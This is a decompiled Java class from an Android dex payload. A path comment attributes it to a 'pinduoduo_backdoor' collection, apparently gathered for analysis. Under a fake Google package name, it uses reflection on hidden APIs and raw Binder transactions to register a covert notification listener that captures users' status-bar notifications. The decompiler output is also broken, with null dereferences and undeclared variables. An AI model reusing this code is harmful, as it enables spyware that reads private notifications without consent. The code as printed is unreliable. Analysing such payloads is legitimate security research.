package com.google.android.sd.biz_dynamic_dex.ud_notification_listener;

import android.app.ActivityManager;
import android.os.Binder;
import android.os.IBinder;
import android.os.IInterface;
import android.os.Parcel;
import android.service.notification.StatusBarNotification;
import java.lang.reflect.Field;

public final class c {
  IBinder a;
  
  IBinder b;
  
  static int a() {
    try {
      Object object = ActivityManager.class.getDeclaredMethod("getCurrentUser", new Class[0]).invoke(null, new Object[0]);
      if (object != null)
        return ((Integer)object).intValue(); 
      throw new Exception("invoke failed");
    } finally {
      Exception exception = null;
      StringBuilder stringBuilder = new StringBuilder("get user id failed: ");
      stringBuilder.append(exception.getMessage());
    } 
  }
  
  static int a(String paramString1, String paramString2) {
    Field field = Class.forName(paramString1).getDeclaredField(paramString2);
    field.setAccessible(true);
    return ((Integer)field.get(null)).intValue();
  }
  
  static StatusBarNotification a(IBinder paramIBinder) {
    Parcel parcel1 = Parcel.obtain();
    Parcel parcel2 = Parcel.obtain();
    IBinder iBinder = null;
    try {
      parcel1.writeInterfaceToken("android.service.notification.IStatusBarNotificationHolder");
      int i = a("android.service.notification.IStatusBarNotificationHolder$Stub", "TRANSACTION_get");
      if (i == -1)
        return (StatusBarNotification)paramIBinder; 
      paramIBinder.transact(i, parcel1, parcel2, 0);
      parcel2.readException();
      paramIBinder = iBinder;
      return statusBarNotification;
    } finally {
      paramIBinder = null;
      parcel2.recycle();
      parcel1.recycle();
    } 
  }
  
  static final class a extends Binder implements IInterface {
    private final c.b a;
    
    private final int b;
    
    public a(c.b param1b, int param1Int) {
      this.a = param1b;
      this.b = param1Int;
    }
    
    public final IBinder asBinder() {
      return (IBinder)this;
    }
    
    protected final boolean onTransact(int param1Int1, Parcel param1Parcel1, Parcel param1Parcel2, int param1Int2) {
      StatusBarNotification statusBarNotification;
      c.b b1;
      int i = this.b;
      if (i == -1)
        return true; 
      if (i == param1Int1) {
        param1Parcel1.enforceInterface("android.service.notification.INotificationListener");
        statusBarNotification = c.a(param1Parcel1.readStrongBinder());
        b1 = this.a;
        if (b1 != null)
          b1.a(statusBarNotification); 
        return true;
      } 
      return super.onTransact(param1Int1, (Parcel)statusBarNotification, (Parcel)b1, param1Int2);
    }
  }
  
  public static interface b {
    void a(StatusBarNotification param1StatusBarNotification);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\ab8ed4c3482c42a1b8baef558ee79deb-dex2jar.jar!\com\google\android\sd\biz_dynamic_de\\ud_notification_listener\c.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */